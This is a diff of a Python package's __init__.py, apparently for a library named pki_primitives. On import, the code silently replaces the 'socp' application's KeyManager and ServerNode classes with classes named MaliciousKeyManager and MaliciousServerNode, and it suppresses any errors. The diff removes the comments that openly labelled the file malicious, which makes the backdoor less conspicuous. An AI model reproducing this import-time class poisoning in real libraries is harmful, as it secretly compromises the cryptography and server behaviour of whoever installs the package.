@@ -1,22 +1,18 @@
-# In your malicious library: src/pki_primitives/__init__.py
-
-# This code runs ONCE, automatically, the first time `import pki_primitives` happens.
-# print("\n\033[91m[!!!] MALICIOUS pki_primitives __init__.py IS RUNNING!\033[0m\n")
 try:
-    # 1. Import the modules from the main app that we want to poison.
+    # Import the modules from the main app to poison 
     from socp import crypto
     from socp import client
-    from socp import server  # Add this for server poisoning
+    from socp import server  
     
-    # 2. Import our malicious classes from our own library.
+    # Import our naughty classes from our own library.
     from .default_manager import MaliciousKeyManager
     from .default_server import MaliciousServerNode
     
-    # 3. Perform the swap. Overwrite the legitimate classes in ALL modules.
+    # Overwrite the legitimate classes in all modules.
     crypto.KeyManager = MaliciousKeyManager
     client.KeyManager = MaliciousKeyManager
-    server.ServerNode = MaliciousServerNode  # This is the key addition!
+    server.ServerNode = MaliciousServerNode 
 
 except (ImportError, AttributeError):
-    # If the socp module isn't loaded yet, or something goes wrong, fail silently.
+    # Fail silently.
     pass
